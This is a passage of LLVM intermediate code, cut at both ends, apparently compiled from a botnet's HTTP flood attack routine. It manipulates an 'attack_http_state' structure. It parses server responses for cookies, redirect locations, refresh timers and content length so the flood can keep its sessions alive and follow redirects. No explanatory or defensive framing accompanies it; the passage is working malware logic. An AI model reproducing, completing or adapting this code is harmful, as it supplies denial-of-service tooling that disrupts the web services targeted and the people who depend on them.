  %475 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %474) #10
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %476
  %478 = load i8, i8* %477, align 1
  %479 = icmp eq i8 %478, 32
  %480 = zext i1 %479 to i32
  %.555 = add nsw i32 %480, %475
  %481 = sext i32 %.555 to i64
  %482 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %481
  %483 = sub nsw i32 %445, %.555
  %484 = call i32 @util_memsearch(i8* %482, i32 %483, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %485 = icmp eq i32 %484, -1
  br i1 %485, label %497, label %486

; <label>:486:                                    ; preds = %473
  %487 = icmp sgt i32 %484, 1
  %488 = add nsw i32 %484, -2
  %.556 = select i1 %487, i32 %488, i32 %484
  %489 = add nsw i32 %.555, %.556
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %490
  store i8 0, i8* %491, align 1
  %492 = call i32 @util_strlen(i8* %482) #10
  %493 = call i8* @table_retrieve_val(i32 50, i32* null)
  %494 = call i32 @util_stristr(i8* %482, i32 %492, i8* %493) #10
  %495 = icmp eq i32 %494, 0
  br i1 %495, label %497, label %496

; <label>:496:                                    ; preds = %486
  store i32 1, i32* %469, align 4
  br label %497

; <label>:497:                                    ; preds = %486, %473, %468, %496
  %498 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  store i32 0, i32* %498, align 4
  %499 = call i8* @table_retrieve_val(i32 48, i32* null)
  %500 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %499) #10
  %501 = icmp eq i32 %500, -1
  br i1 %501, label %526, label %502

; <label>:502:                                    ; preds = %497
  %503 = call i8* @table_retrieve_val(i32 48, i32* null)
  %504 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %503) #10
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %505
  %507 = load i8, i8* %506, align 1
  %508 = icmp eq i8 %507, 32
  %509 = zext i1 %508 to i32
  %.557 = add nsw i32 %509, %504
  %510 = sext i32 %.557 to i64
  %511 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %510
  %512 = sub nsw i32 %445, %.557
  %513 = call i32 @util_memsearch(i8* %511, i32 %512, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %514 = icmp eq i32 %513, -1
  br i1 %514, label %526, label %515

; <label>:515:                                    ; preds = %502
  %516 = icmp sgt i32 %513, 1
  %517 = add nsw i32 %513, -2
  %.558 = select i1 %516, i32 %517, i32 %513
  %518 = add nsw i32 %.557, %.558
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %519
  store i8 0, i8* %520, align 1
  %521 = call i32 @util_strlen(i8* %511) #10
  %522 = call i8* @table_retrieve_val(i32 49, i32* null)
  %523 = call i32 @util_stristr(i8* %511, i32 %521, i8* %522) #10
  %524 = icmp eq i32 %523, 0
  br i1 %524, label %526, label %525

; <label>:525:                                    ; preds = %515
  store i32 1, i32* %498, align 4
  br label %526

; <label>:526:                                    ; preds = %515, %502, %497, %525
  %527 = call i8* @table_retrieve_val(i32 47, i32* null)
  %528 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %527) #10
  %529 = icmp eq i32 %528, -1
  br i1 %529, label %.sink.split, label %530

; <label>:530:                                    ; preds = %526
  %531 = call i8* @table_retrieve_val(i32 47, i32* null)
  %532 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %531) #10
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %533
  %535 = load i8, i8* %534, align 1
  %536 = icmp eq i8 %535, 32
  %537 = zext i1 %536 to i32
  %.559 = add nsw i32 %537, %532
  %538 = sext i32 %.559 to i64
  %539 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %538
  %540 = sub nsw i32 %445, %.559
  %541 = call i32 @util_memsearch(i8* %539, i32 %540, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %542 = icmp eq i32 %541, -1
  br i1 %542, label %.preheader589, label %543

; <label>:543:                                    ; preds = %530
  %544 = icmp sgt i32 %541, 1
  %545 = add nsw i32 %541, -2
  %.560 = select i1 %544, i32 %545, i32 %541
  %546 = add nsw i32 %.559, %.560
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %547
  store i8 0, i8* %548, align 1
  %549 = call i32 @util_atoi(i8* %539, i32 10) #10
  br label %.sink.split

.sink.split:                                      ; preds = %526, %543
  %.sink6 = phi i32 [ %549, %543 ], [ 0, %526 ]
  %550 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  store i32 %.sink6, i32* %550, align 4
  br label %.preheader589

.preheader589:                                    ; preds = %530, %.sink.split
  %551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  %552 = call i8* @table_retrieve_val(i32 46, i32* null)
  %553 = call i32 @util_stristr(i8* nonnull %59, i32 %445, i8* %552) #10
  %554 = icmp eq i32 %553, -1
  br i1 %554, label %.critedge561, label %.lr.ph625.preheader

.lr.ph625.preheader:                              ; preds = %.preheader589
  br label %.lr.ph625

.lr.ph625:                                        ; preds = %.lr.ph625.preheader, %.loopexit
  %555 = phi i8* [ %623, %.loopexit ], [ %59, %.lr.ph625.preheader ]
  %.0539624 = phi i32 [ %621, %.loopexit ], [ 0, %.lr.ph625.preheader ]
  %556 = load i32, i32* %551, align 4
  %557 = icmp slt i32 %556, 5
  br i1 %557, label %558, label %.critedge561.loopexit

; <label>:558:                                    ; preds = %.lr.ph625
  %559 = call i8* @table_retrieve_val(i32 46, i32* null)
  %560 = call i32 @util_stristr(i8* %555, i32 %445, i8* %559) #10
  %561 = add nsw i32 %560, %.0539624
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %562
  %564 = load i8, i8* %563, align 1
  %565 = icmp eq i8 %564, 32
  %566 = zext i1 %565 to i32
  %.562 = add nsw i32 %566, %560
  %567 = sext i32 %.562 to i64
  %568 = getelementptr inbounds i8, i8* %555, i64 %567
  %569 = sub nsw i32 %445, %.0539624
  %570 = sub i32 %569, %.562
  %571 = call i32 @util_memsearch(i8* %568, i32 %570, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %572 = icmp eq i32 %571, -1
  br i1 %572, label %.loopexit, label %573

; <label>:573:                                    ; preds = %558
  %574 = add nsw i32 %.562, %.0539624
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %575
  %577 = icmp sgt i32 %571, 1
  %578 = add nsw i32 %571, -2
  %.563 = select i1 %577, i32 %578, i32 %571
  %579 = call i32 @util_memsearch(i8* %568, i32 %570, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %580 = icmp sgt i32 %579, 0
  %581 = add nsw i32 %579, -1
  %..563 = select i1 %580, i32 %581, i32 %.563
  %582 = add nsw i32 %..563, %574
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %583
  store i8 0, i8* %584, align 1
  store i32 0, i32* %5, align 4
  %585 = call i32 @util_strlen(i8* nonnull %576) #10
  %586 = icmp sgt i32 %585, 0
  br i1 %586, label %.lr.ph619.preheader, label %._crit_edge620

.lr.ph619.preheader:                              ; preds = %573
  br label %.lr.ph619

; <label>:587:                                    ; preds = %.lr.ph619
  store i32 %595, i32* %5, align 4
  %588 = call i32 @util_strlen(i8* nonnull %576) #10
  %589 = icmp slt i32 %595, %588
  br i1 %589, label %.lr.ph619, label %._crit_edge620.loopexit

.lr.ph619:                                        ; preds = %.lr.ph619.preheader, %587
  %590 = load i32, i32* %5, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds i8, i8* %576, i64 %591
  %593 = load i8, i8* %592, align 1
  %594 = icmp eq i8 %593, 61
  %595 = add nsw i32 %590, 1
  br i1 %594, label %._crit_edge620.loopexit, label %587

._crit_edge620.loopexit:                          ; preds = %.lr.ph619, %587
  br label %._crit_edge620

._crit_edge620:                                   ; preds = %._crit_edge620.loopexit, %573
  %596 = load i32, i32* %5, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds i8, i8* %576, i64 %597
  %599 = load i8, i8* %598, align 1
  %600 = icmp eq i8 %599, 61
  br i1 %600, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge620
  store i32 0, i32* %5, align 4
  %601 = load i32, i32* %551, align 4
  %602 = icmp sgt i32 %601, 0
  br i1 %602, label %.lr.ph623.preheader, label %.critedge564

.lr.ph623.preheader:                              ; preds = %.preheader
  br label %.lr.ph623

.lr.ph623:                                        ; preds = %.lr.ph623.preheader, %607
  %storemerge547622 = phi i32 [ %609, %607 ], [ 0, %.lr.ph623.preheader ]
  %603 = sext i32 %storemerge547622 to i64
  %604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %603, i64 0
  %605 = call signext i8 @util_strncmp(i8* %576, i8* %604, i32 %596) #10
  %606 = icmp eq i8 %605, 0
  br i1 %606, label %607, label %.loopexit.loopexit

; <label>:607:                                    ; preds = %.lr.ph623
  %608 = load i32, i32* %5, align 4
  %609 = add nsw i32 %608, 1
  store i32 %609, i32* %5, align 4
  %610 = load i32, i32* %551, align 4
  %611 = icmp slt i32 %609, %610
  br i1 %611, label %.lr.ph623, label %.critedge564.loopexit

.critedge564.loopexit:                            ; preds = %607
  br label %.critedge564

.critedge564:                                     ; preds = %.critedge564.loopexit, %.preheader
  %612 = call i32 @util_strlen(i8* %576) #10
  %613 = icmp slt i32 %612, 128
  br i1 %613, label %614, label %.loopexit

; <label>:614:                                    ; preds = %.critedge564
  %615 = load i32, i32* %551, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %616, i64 0
  %618 = call i32 @util_strcpy(i8* %617, i8* %576) #10
  %619 = load i32, i32* %551, align 4
  %620 = add nsw i32 %619, 1
  store i32 %620, i32* %551, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph623
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %558, %._crit_edge620, %.critedge564, %614
  %621 = add nsw i32 %.562, %.0539624
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %622
  %624 = call i8* @table_retrieve_val(i32 46, i32* null)
  %625 = call i32 @util_stristr(i8* %623, i32 %445, i8* %624) #10
  %626 = icmp eq i32 %625, -1
  br i1 %626, label %.critedge561.loopexit, label %.lr.ph625

.critedge561.loopexit:                            ; preds = %.loopexit, %.lr.ph625
  br label %.critedge561

.critedge561:                                     ; preds = %.critedge561.loopexit, %.preheader589
  %627 = call i8* @table_retrieve_val(i32 45, i32* null)
  %628 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %627) #10
  %629 = icmp eq i32 %628, -1
  br i1 %629, label %722, label %630

; <label>:630:                                    ; preds = %.critedge561
  %631 = call i8* @table_retrieve_val(i32 45, i32* null)
  %632 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %631) #10
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %633
  %635 = load i8, i8* %634, align 1
  %636 = icmp eq i8 %635, 32
  %637 = zext i1 %636 to i32
  %.565 = add nsw i32 %637, %632
  %638 = sext i32 %.565 to i64
  %639 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %638
  %640 = sub nsw i32 %445, %.565
  %641 = call i32 @util_memsearch(i8* %639, i32 %640, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %642 = icmp eq i32 %641, -1
  br i1 %642, label %722, label %643

; <label>:643:                                    ; preds = %630
  %644 = icmp sgt i32 %641, 1
  %645 = add nsw i32 %641, -2
  %.566 = select i1 %644, i32 %645, i32 %641
  %646 = add nsw i32 %.565, %.566
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %647
  store i8 0, i8* %648, align 1
  %649 = add nsw i32 %.566, 1
  %650 = call i32 @util_memsearch(i8* %639, i32 %649, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %651 = icmp eq i32 %650, 4
  br i1 %651, label %652, label %697

; <label>:652:                                    ; preds = %643
  %653 = getelementptr inbounds i8, i8* %639, i64 4
  %654 = load i8, i8* %653, align 1
  %655 = icmp eq i8 %654, 115
  %.567 = select i1 %655, i32 8, i32 7
  store i32 %.567, i32* %5, align 4
  %656 = zext i32 %.567 to i64
  %657 = getelementptr inbounds i8, i8* %639, i64 %656
  %658 = sub nsw i32 %649, %.567
  %659 = sext i32 %658 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %639, i8* %657, i64 %659, i32 1, i1 false)
  br label %660

; <label>:660:                                    ; preds = %665, %652
  %indvars.iv653 = phi i64 [ %indvars.iv.next654, %665 ], [ 0, %652 ]
  %661 = getelementptr inbounds i8, i8* %639, i64 %indvars.iv653
  %662 = load i8, i8* %661, align 1
  switch i8 %662, label %665 [
    i8 0, label %.loopexit588
    i8 47, label %663
  ]

; <label>:663:                                    ; preds = %660
  %664 = trunc i64 %indvars.iv653 to i32
  store i32 %664, i32* %5, align 4
  store i8 0, i8* %661, align 1
  br label %667

; <label>:665:                                    ; preds = %660
  %indvars.iv.next654 = add nuw i64 %indvars.iv653, 1
  br label %660

.loopexit588:                                     ; preds = %660
  %666 = trunc i64 %indvars.iv653 to i32
  store i32 %666, i32* %5, align 4
  br label %667

; <label>:667:                                    ; preds = %.loopexit588, %663
  %668 = call i32 @util_strlen(i8* nonnull %639) #10
  %669 = icmp sgt i32 %668, 0
  br i1 %669, label %670, label %676

; <label>:670:                                    ; preds = %667
  %671 = call i32 @util_strlen(i8* nonnull %639) #10
  %672 = icmp slt i32 %671, 128
  br i1 %672, label %673, label %676

; <label>:673:                                    ; preds = %670
  %674 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %675 = call i32 @util_strcpy(i8* %674, i8* nonnull %639) #10
  br label %676

; <label>:676:                                    ; preds = %673, %670, %667
  %677 = load i32, i32* %5, align 4
  %678 = add nsw i32 %677, 1
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds i8, i8* %639, i64 %679
  %681 = call i32 @util_strlen(i8* %680) #10
  %682 = icmp slt i32 %681, 256
  br i1 %682, label %683, label %721

; <label>:683:                                    ; preds = %676
  %684 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %684, i32 255) #10
  %685 = load i32, i32* %5, align 4
  %686 = add nsw i32 %685, 1
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds i8, i8* %639, i64 %687
  %689 = call i32 @util_strlen(i8* %688) #10
  %690 = icmp sgt i32 %689, 0
  br i1 %690, label %691, label %721

; <label>:691:                                    ; preds = %683
  %692 = load i32, i32* %5, align 4
  %693 = add nsw i32 %692, 1
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds i8, i8* %639, i64 %694
  %696 = call i32 @util_strcpy(i8* %684, i8* %695) #10
  br label %721

; <label>:697:                                    ; preds = %643
  %698 = load i8, i8* %639, align 1
  %699 = icmp eq i8 %698, 47
  br i1 %699, label %700, label %721

; <label>:700:                                    ; preds = %697
  %701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %701, i32 255) #10
  %702 = load i32, i32* %5, align 4
  %703 = add nsw i32 %702, 1
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds i8, i8* %639, i64 %704
  %706 = call i32 @util_strlen(i8* %705) #10
  %707 = icmp sgt i32 %706, 0
  br i1 %707, label %708, label %721

; <label>:708:                                    ; preds = %700
  %709 = load i32, i32* %5, align 4
  %710 = add nsw i32 %709, 1
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds i8, i8* %639, i64 %711
  %713 = call i32 @util_strlen(i8* %712) #10
  %714 = icmp slt i32 %713, 256
  br i1 %714, label %715, label %721

; <label>:715:                                    ; preds = %708
  %716 = load i32, i32* %5, align 4
  %717 = add nsw i32 %716, 1
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds i8, i8* %639, i64 %718
  %720 = call i32 @util_strcpy(i8* %701, i8* %719) #10
  br label %721

; <label>:721:                                    ; preds = %697, %715, %708, %700, %676, %691, %683
  store i8 1, i8* %431, align 4
  br label %.loopexit591

; <label>:722:                                    ; preds = %630, %.critedge561
  %723 = call i8* @table_retrieve_val(i32 44, i32* null)
  %724 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %723) #10
  %725 = icmp eq i32 %724, -1
  br i1 %725, label %888, label %726

; <label>:726:                                    ; preds = %722
  %727 = call i8* @table_retrieve_val(i32 44, i32* null)
  %728 = call i32 @util_stristr(i8* nonnull %21, i32 %445, i8* %727) #10
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %729
  %731 = load i8, i8* %730, align 1
  %732 = icmp eq i8 %731, 32
  %733 = zext i1 %732 to i32
  %.568 = add nsw i32 %733, %728
  %734 = sext i32 %.568 to i64
  %735 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %734
  %736 = sub nsw i32 %445, %.568
  %737 = call i32 @util_memsearch(i8* %735, i32 %736, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %738 = icmp eq i32 %737, -1
  br i1 %738, label %888, label %739

; <label>:739:                                    ; preds = %726
  %740 = icmp sgt i32 %737, 1
  %741 = add nsw i32 %737, -2
  %.569 = select i1 %740, i32 %741, i32 %737
  %742 = add nsw i32 %.568, %.569
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %743
  store i8 0, i8* %744, align 1
  br label %745

; <label>:745:                                    ; preds = %745, %739
  %indvars.iv655 = phi i64 [ %indvars.iv.next656, %745 ], [ 0, %739 ]
  %746 = getelementptr inbounds i8, i8* %735, i64 %indvars.iv655
  %747 = load i8, i8* %746, align 1
  %.off585 = add i8 %747, -48
  %748 = icmp ult i8 %.off585, 10
  %indvars.iv.next656 = add nuw i64 %indvars.iv655, 1
  br i1 %748, label %745, label %.critedge

.critedge:                                        ; preds = %745
  %749 = add nsw i32 %.569, 1
  %750 = trunc i64 %indvars.iv655 to i32
  store i32 %750, i32* %5, align 4
  %751 = icmp eq i8 %747, 0
  br i1 %751, label %888, label %752

; <label>:752:                                    ; preds = %.critedge
  store i8 0, i8* %746, align 1
  %753 = load i32, i32* %5, align 4
  %754 = add nsw i32 %753, 1
  store i32 %754, i32* %5, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds i8, i8* %735, i64 %755
  %757 = load i8, i8* %756, align 1
  %758 = icmp eq i8 %757, 32
  br i1 %758, label %759, label %761

; <label>:759:                                    ; preds = %752
  %760 = add nsw i32 %753, 2
  store i32 %760, i32* %5, align 4
  br label %761

; <label>:761:                                    ; preds = %759, %752
  %762 = load i32, i32* %5, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds i8, i8* %735, i64 %763
  %765 = call i32 @util_strlen(i8* %764) #10
  %766 = call i32 @util_stristr(i8* %764, i32 %765, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #10
  %767 = icmp eq i32 %766, -1
  br i1 %767, label %776, label %768

; <label>:768:                                    ; preds = %761
  %769 = load i32, i32* %5, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds i8, i8* %735, i64 %770
  %772 = call i32 @util_strlen(i8* %771) #10
  %773 = call i32 @util_stristr(i8* %771, i32 %772, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #10
  %774 = load i32, i32* %5, align 4
  %775 = add nsw i32 %774, %773
  store i32 %775, i32* %5, align 4
  br label %776

; <label>:776:                                    ; preds = %761, %768
  %777 = load i32, i32* %5, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds i8, i8* %735, i64 %778
  %780 = load i8, i8* %779, align 1
  %781 = icmp eq i8 %780, 34
  br i1 %781, label %782, label %800

; <label>:782:                                    ; preds = %776
  %783 = add nsw i32 %777, 1
  store i32 %783, i32* %5, align 4
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds i8, i8* %735, i64 %784
  %786 = call i32 @util_strlen(i8* %785) #10
  %787 = add nsw i32 %786, -1
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds i8, i8* %785, i64 %788
  %790 = load i8, i8* %789, align 1
  %791 = icmp eq i8 %790, 34
  br i1 %791, label %792, label %800

; <label>:792:                                    ; preds = %782
  %793 = load i32, i32* %5, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds i8, i8* %735, i64 %794
  %796 = call i32 @util_strlen(i8* %795) #10
  %797 = add nsw i32 %796, -1
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds i8, i8* %795, i64 %798
  store i8 0, i8* %799, align 1
  br label %800

; <label>:800:                                    ; preds = %782, %792, %776
  %801 = call i32 @util_atoi(i8* nonnull %735, i32 10) #10
  %802 = add i32 %801, %392
  %803 = zext i32 %802 to i64
  %.off = add i32 %801, -1
  %804 = icmp ult i32 %.off, 9
  br i1 %804, label %.lr.ph629.preheader, label %.critedge12

.lr.ph629.preheader:                              ; preds = %800
  %805 = call i64 @time(i64* null) #10
  %806 = icmp sgt i64 %803, %805
  br i1 %806, label %.lr.ph629.preheader698, label %.critedge12

.lr.ph629.preheader698:                           ; preds = %.lr.ph629.preheader
  br label %.lr.ph629

.lr.ph629:                                        ; preds = %.lr.ph629.preheader698, %.lr.ph629
  %807 = call i32 @sleep(i32 1) #10
  %808 = call i64 @time(i64* null) #10
  %809 = icmp sgt i64 %803, %808
  br i1 %809, label %.lr.ph629, label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.lr.ph629
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %.lr.ph629.preheader, %800
  %810 = load i32, i32* %5, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds i8, i8* %735, i64 %811
  %813 = call i32 @util_strlen(i8* %812) #10
  %814 = call i32 @util_stristr(i8* %812, i32 %813, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #10
  %815 = icmp eq i32 %814, 4
  br i1 %815, label %816, label %861

; <label>:816:                                    ; preds = %.critedge12
  %817 = getelementptr inbounds i8, i8* %812, i64 4
  %818 = load i8, i8* %817, align 1
  %819 = icmp eq i8 %818, 115
  %.572 = select i1 %819, i32 8, i32 7
  store i32 %.572, i32* %5, align 4
  %820 = zext i32 %.572 to i64
  %821 = getelementptr inbounds i8, i8* %812, i64 %820
  %822 = sub i32 %749, %.572
  %823 = sext i32 %822 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %812, i8* %821, i64 %823, i32 1, i1 false)
  br label %824

; <label>:824:                                    ; preds = %829, %816
  %indvars.iv657 = phi i64 [ %indvars.iv.next658, %829 ], [ 0, %816 ]
  %825 = getelementptr inbounds i8, i8* %812, i64 %indvars.iv657
  %826 = load i8, i8* %825, align 1
  switch i8 %826, label %829 [
    i8 0, label %.loopexit587
    i8 47, label %827
  ]

; <label>:827:                                    ; preds = %824
  %828 = trunc i64 %indvars.iv657 to i32
  store i32 %828, i32* %5, align 4
  store i8 0, i8* %825, align 1
  br label %831

; <label>:829:                                    ; preds = %824
  %indvars.iv.next658 = add nuw i64 %indvars.iv657, 1
  br label %824

.loopexit587:                                     ; preds = %824
  %830 = trunc i64 %indvars.iv657 to i32
  store i32 %830, i32* %5, align 4
  br label %831

; <label>:831:                                    ; preds = %.loopexit587, %827
  %832 = call i32 @util_strlen(i8* nonnull %812) #10
  %833 = icmp sgt i32 %832, 0
  br i1 %833, label %834, label %840

; <label>:834:                                    ; preds = %831
  %835 = call i32 @util_strlen(i8* nonnull %812) #10
  %836 = icmp slt i32 %835, 128
  br i1 %836, label %837, label %840

; <label>:837:                                    ; preds = %834
  %838 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %839 = call i32 @util_strcpy(i8* %838, i8* nonnull %812) #10
  br label %840

; <label>:840:                                    ; preds = %837, %834, %831
  %841 = load i32, i32* %5, align 4
  %842 = add nsw i32 %841, 1
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds i8, i8* %812, i64 %843
  %845 = call i32 @util_strlen(i8* %844) #10
  %846 = icmp slt i32 %845, 256
  br i1 %846, label %847, label %885

; <label>:847:                                    ; preds = %840
  %848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %848, i32 255) #10
  %849 = load i32, i32* %5, align 4
  %850 = add nsw i32 %849, 1
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds i8, i8* %812, i64 %851
  %853 = call i32 @util_strlen(i8* %852) #10
  %854 = icmp sgt i32 %853, 0
  br i1 %854, label %855, label %885

; <label>:855:                                    ; preds = %847
  %856 = load i32, i32* %5, align 4
  %857 = add nsw i32 %856, 1
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds i8, i8* %812, i64 %858
  %860 = call i32 @util_strcpy(i8* %848, i8* %859) #10
  br label %885

; <label>:861:                                    ; preds = %.critedge12
  %862 = load i8, i8* %812, align 1
  %863 = icmp eq i8 %862, 47
  br i1 %863, label %864, label %885

; <label>:864:                                    ; preds = %861
  %865 = load i32, i32* %5, align 4
  %866 = add nsw i32 %865, 1
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds i8, i8* %812, i64 %867
  %869 = call i32 @util_strlen(i8* %868) #10
  %870 = icmp slt i32 %869, 256
  br i1 %870, label %871, label %885

; <label>:871:                                    ; preds = %864
  %872 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %872, i32 255) #10
  %873 = load i32, i32* %5, align 4
  %874 = add nsw i32 %873, 1
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds i8, i8* %812, i64 %875
  %877 = call i32 @util_strlen(i8* %876) #10
  %878 = icmp sgt i32 %877, 0
  br i1 %878, label %879, label %885

; <label>:879:                                    ; preds = %871
  %880 = load i32, i32* %5, align 4
  %881 = add nsw i32 %880, 1
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds i8, i8* %812, i64 %882
  %884 = call i32 @util_strcpy(i8* %872, i8* %883) #10
  br label %885

; <label>:885:                                    ; preds = %861, %871, %879, %864, %840, %855, %847
  %886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %887 = bitcast i8* %886 to i32*
  store i32 5522759, i32* %887, align 1
  store i8 10, i8* %431, align 4
  br label %.loopexit591

; <label>:888:                                    ; preds = %.critedge, %726, %722
  %889 = call i32 @util_memsearch(i8* nonnull %21, i32 %445, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %890 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %891 = call signext i8 @util_strcmp(i8* %890, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #10
  %892 = icmp eq i8 %891, 0
  br i1 %892, label %893, label %898

; <label>:893:                                    ; preds = %888
  %894 = call signext i8 @util_strcmp(i8* %890, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #10
  %895 = icmp eq i8 %894, 0
  br i1 %895, label %896, label %898

; <label>:896:                                    ; preds = %893
  %897 = icmp sgt i32 %445, %889
  %.sink13 = select i1 %897, i8 10, i8 1
  br label %898

; <label>:898:                                    ; preds = %888, %893, %896
  %storemerge542 = phi i8 [ %.sink13, %896 ], [ 7, %893 ], [ 7, %888 ]
  store i8 %storemerge542, i8* %431, align 4
  %899 = load i32, i32* %394, align 4
  %900 = sext i32 %889 to i64
  %901 = call i64 @recv(i32 %899, i8* nonnull %21, i64 %900, i32 16384) #10
  br label %.loopexit591

; <label>:902:                                    ; preds = %.preheader590, %.backedge
  %903 = load i32, i32* %433, align 4
  %904 = icmp eq i32 %903, 1024
  br i1 %904, label %905, label %908

; <label>:905:                                    ; preds = %902
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %434, i8* nonnull %435, i64 960, i32 1, i1 false)
  %906 = load i32, i32* %433, align 4
